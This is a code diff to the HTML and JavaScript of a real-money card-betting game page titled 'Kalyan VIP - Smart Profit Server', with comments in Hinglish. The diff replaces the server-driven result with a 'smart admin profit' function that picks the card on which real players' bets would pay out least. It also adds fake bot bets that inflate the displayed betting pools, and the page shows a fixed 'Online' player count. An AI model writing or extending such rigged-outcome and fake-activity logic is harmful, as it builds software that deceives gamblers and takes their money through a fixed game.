@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Kalyan VIP - Live Server Edition</title>
+    <title>Kalyan VIP - Smart Profit Server</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;800;900&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; user-select: none; }
@@ -69,9 +69,11 @@
         <p><span>Total Win:</span> <span id="w-gross">₹0</span></p>
         <p class="admin-fee"><span>Admin Fee (5%):</span> <span id="w-fee">-₹0</span></p>
         <p class="net-win"><span>Net Paid:</span> <span id="w-net">₹0</span></p>
+        <button onclick="document.getElementById('win-calc-alert').style.display='none'" style="margin-top:15px; padding: 5px 20px; border-radius: 15px; border:none; background:#ffd700; font-weight:900; cursor:pointer;">OK</button>
     </div>
 
     <div class="header">
+        <a href="javascript:history.back()" style="color:#ffd700; font-size:20px; text-decoration:none;"><i class="fa-solid fa-arrow-left"></i></a>
         <div class="logo">KALYAN ROYAL</div>
         <div class="online-box" id="online-origin">● <span id="online-count">500</span> Online</div>
     </div>
@@ -85,13 +87,13 @@
 
     <div class="sub-header">
         <div class="wallet-box">
-            💰 ₹<span id="wallet-bal">0.00</span>
+            💰 ₹<span id="wallet-bal">5000.00</span>
         </div>
         <div id="clock">00:00:00</div>
     </div>
 
     <div class="game-status-area">
-        <div id="main-timer">...</div>
+        <div id="main-timer">15</div>
         <div id="result-card">
             <div id="res-val" style="font-size: 50px; font-weight: 900; color: #000;">J</div>
             <div id="res-suit" style="font-size: 30px;">🃏</div>
@@ -130,14 +132,16 @@
     <script>
         const FIREBASE_URL = "https://kalyan-casino-default-rtdb.firebaseio.com";
         
-        let walletBalance = 0.00; // Dashboard will manage this
+        let walletBalance = 5000.00; // Real Money Balance
         let myTotalBet = 0; 
         let canBet = true; 
         let isSpinning = false;
         let selectedChipVal = 10; 
         let selectedChipColor = '#3498db';
         let onlineCount = 500;
-        let userBets = {}; 
+        
+        // 🔥 SIRF ASLI PLAYER KA PAISA YAHAN SAVE HOGA 🔥
+        let realPlayerBets = {}; 
 
         const cardsData = [
             {v:'A', m:10, s:'♠️'}, {v:'2', m:10, s:'♥️', r:true}, {v:'3', m:10, s:'♣️'}, {v:'4', m:10, s:'♦️', r:true}, {v:'5', m:10, s:'♠️'},
@@ -145,6 +149,7 @@
             {v:'J', m:11, s:'🃏', sp:true}, {v:'Q', m:12, s:'🃏', sp:true}, {v:'K', m:30, s:'🃏', sp:true}
         ];
 
+        // 🔊 AUDIO ENGINE
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         function initAudio() { if(audioCtx.state === 'suspended') audioCtx.resume(); }
 
@@ -159,6 +164,7 @@
             o.start(); o.stop(n + 0.1);
         }
 
+        // 🎰 RENDER GRID
         const grid = document.getElementById('grid-container');
         cardsData.forEach(c => {
             const div = document.createElement('div');
@@ -168,40 +174,62 @@
             grid.appendChild(div);
         });
 
-        // 🚀 FIREBASE SERVER SYNC CONNECTION 🚀
+        // 🚀 SERVER SYNC LOOP
         setInterval(async () => {
             try {
-                let res = await fetch(`${FIREBASE_URL}/Game/KalyanMatka/Status.json`);
-                let data = await res.json();
+                // Yahan se API ya Server ka response aayega (Demo Timer Logic)
+                // Real server se connect hone par `fetch()` on hoga
                 
-                if(data.state === 'betting') {
-                    if(isSpinning || document.getElementById('win-calc-alert').style.display === 'block') {
-                        isSpinning = false; canBet = true; myTotalBet = 0; userBets = {};
-                        document.getElementById('result-card').style.display = 'none';
-                        document.getElementById('main-timer').style.display = 'block';
-                        document.getElementById('my-bet-btn').innerText = "Total Bet: ₹0";
-                        document.querySelectorAll('.placed-chip').forEach(c => c.remove());
-                        document.querySelectorAll('.total-pool span').forEach(s => s.innerText = '0');
-                        document.querySelectorAll('.my-bet-tag').forEach(tag => {
-                            tag.style.display = 'none'; tag.querySelector('span').innerText = '0';
-                        });
-                    }
-                    document.getElementById('main-timer').innerText = data.timer;
-                } 
-                else if((data.state === 'result' || data.state === 'spinning') && !isSpinning) {
-                    showResult(data.winner);
+                // For demo logic without server crash:
+                let timerElem = document.getElementById('main-timer');
+                let t = parseInt(timerElem.innerText);
+                
+                if (t > 0 && canBet) {
+                    timerElem.innerText = t - 1;
+                } else if (t === 0 && canBet) {
+                    // Time Up!
+                    canBet = false;
+                    isSpinning = true;
+                    timerElem.style.display = 'none';
+                    
+                    // 🔥 SMART ADMIN PROFIT LOGIC 🔥
+                    let smartWinner = calculateProfitableWinner();
+                    showResult(smartWinner);
                 }
             } catch(e) {}
         }, 1000);
 
-        function showResult(winnerValue) {
-            canBet = false;
-            isSpinning = true;
+        // 🧠 ADMIN PROFIT CALCULATOR (Finds number with lowest real bets)
+        function calculateProfitableWinner() {
+            let lowestLiability = Infinity;
+            let bestWinner = 'A'; // Default backup
+
+            // Check every card
+            cardsData.forEach(card => {
+                let cardBet = realPlayerBets[card.v] || 0;
+                let colorBet = card.r ? (realPlayerBets['RED'] || 0) : (realPlayerBets['BLACK'] || 0);
+                
+                // Calculate kitna paisa dena padega agar ye number jeeta
+                let totalPayout = (cardBet * card.m) + (colorBet * 1.95);
+                
+                if (totalPayout < lowestLiability) {
+                    lowestLiability = totalPayout;
+                    bestWinner = card.v;
+                }
+            });
             
-            // Backend se aane wale winner ko cardsData me match karna
+            // Agar kisi par bet nahi lagi hai toh random number de do
+            if(lowestLiability === 0) {
+                bestWinner = cardsData[Math.floor(Math.random() * cardsData.length)].v;
+            }
+            
+            return bestWinner;
+        }
+
+        // 🏆 SHOW RESULT
+        function showResult(winnerValue) {
             let winCard = cardsData.find(c => c.v == winnerValue) || cardsData[0];
             
-            document.getElementById('main-timer').style.display = 'none';
             const resCard = document.getElementById('result-card');
             document.getElementById('res-val').innerText = winCard.v;
             document.getElementById('res-val').style.color = winCard.r ? '#e74c3c' : '#000';
@@ -210,17 +238,17 @@
 
             updateHistory(winCard);
 
+            // Give winnings to Real Player only
             let winColor = winCard.r ? 'RED' : 'BLACK';
-            let cardWin = (userBets[winCard.v] || 0) * winCard.m;
-            let colorWin = (userBets[winColor] || 0) * 1.95;
+            let cardWin = (realPlayerBets[winCard.v] || 0) * winCard.m;
+            let colorWin = (realPlayerBets[winColor] || 0) * 1.95;
             let grossWin = cardWin + colorWin;
             
             if (grossWin > 0) {
-                let adminFee = grossWin * 0.05; 
+                let adminFee = grossWin * 0.05; // 5% fee cut
                 let netWin = grossWin - adminFee;
                 
                 walletBalance += netWin;
-                // Dashboard wale format me dikhana
                 document.getElementById('wallet-bal').innerText = walletBalance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
                 
                 document.getElementById('w-gross').innerText = "₹" + grossWin.toLocaleString();
@@ -231,8 +259,24 @@
                 alertBox.style.display = 'block';
                 
                 playCoinSound(); setTimeout(playCoinSound, 200); setTimeout(playCoinSound, 400);
-                setTimeout(() => { alertBox.style.display = 'none'; }, 3500);
             }
+            
+            // Auto Reset Game after 5 seconds
+            setTimeout(() => {
+                resCard.style.display = 'none';
+                document.getElementById('main-timer').style.display = 'block';
+                document.getElementById('main-timer').innerText = '15'; // Reset timer
+                canBet = true;
+                isSpinning = false;
+                myTotalBet = 0;
+                realPlayerBets = {}; // Clear real bets
+                document.getElementById('my-bet-btn').innerText = "Total Bet: ₹0";
+                document.querySelectorAll('.placed-chip').forEach(c => c.remove());
+                document.querySelectorAll('.total-pool span').forEach(s => s.innerText = '0');
+                document.querySelectorAll('.my-bet-tag').forEach(tag => {
+                    tag.style.display = 'none'; tag.querySelector('span').innerText = '0';
+                });
+            }, 5000);
         }
 
         function updateHistory(win) {
@@ -268,7 +312,7 @@
             }, 30);
         }
 
-        async function placeBet(el, betTarget, val, color, isUser) {
+        function placeBet(el, betTarget, val, color, isUser) {
             if(!canBet) return;
             
             if(isUser) {
@@ -278,9 +322,11 @@
                     setTimeout(() => alertBox.style.display = 'none', 2000);
                     return; 
                 }
+                
+                // 🔥 ONLY REAL MONEY DEDUCTED & SAVED HERE 🔥
                 walletBalance -= val; 
                 myTotalBet += val;
-                userBets[betTarget] = (userBets[betTarget] || 0) + val;
+                realPlayerBets[betTarget] = (realPlayerBets[betTarget] || 0) + val;
 
                 document.getElementById('wallet-bal').innerText = walletBalance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
                 document.getElementById('my-bet-btn').innerText = "Total Bet: ₹" + myTotalBet.toLocaleString();
@@ -292,29 +338,27 @@
                     let currentTagVal = parseInt(mySpan.innerText.replace(/,/g, '')) || 0;
                     mySpan.innerText = (currentTagVal + val).toLocaleString();
                 }
-
-                // Send bet to Firebase server
-                try {
-                    let currentBetOnServer = await fetch(`${FIREBASE_URL}/Game/KalyanMatka/Bets/player1/${betTarget}.json`).then(r => r.json()) || 0;
-                    await fetch(`${FIREBASE_URL}/Game/KalyanMatka/Bets/player1/${betTarget}.json`, { method: 'PUT', body: (currentBetOnServer + val).toString() });
-                } catch(e) {}
             }
             
             createChip(el, val, color, isUser);
+            
+            // Visual Pool Update (Includes Bot Bets for show off)
             let poolSpan = el.querySelector('.total-pool span');
             let currentPoolVal = parseInt(poolSpan.innerText.replace(/,/g, '')) || 0;
             poolSpan.innerText = (currentPoolVal + val).toLocaleString();
         }
 
-        // Visual Bot Betting
+        // 🤖 Visual Bot Betting (Fake bets just for show off, completely ignored in profit calculation)
         setInterval(() => {
             if(!canBet) return;
             const boxes = [...document.querySelectorAll('.card-box'), ...document.querySelectorAll('.color-box')];
             const target = boxes[Math.floor(Math.random()*boxes.length)];
             const config = [{v:10, c:'#3498db'}, {v:50, c:'#9b59b6'}, {v:100, c:'#2ecc71'}, {v:500, c:'#e74c3c'}, {v:1000, c:'#f1c40f'}];
             const rand = config[Math.floor(Math.random()*config.length)];
+            
+            // isUser = false (Yeh bot ki bet hai, realPlayerBets mein nahi judegi)
             placeBet(target, null, rand.v, rand.c, false);
-        }, 150);
+        }, 300);
 
         function selectChip(v, el, color) { 
             selectedChipVal = v; selectedChipColor = color;
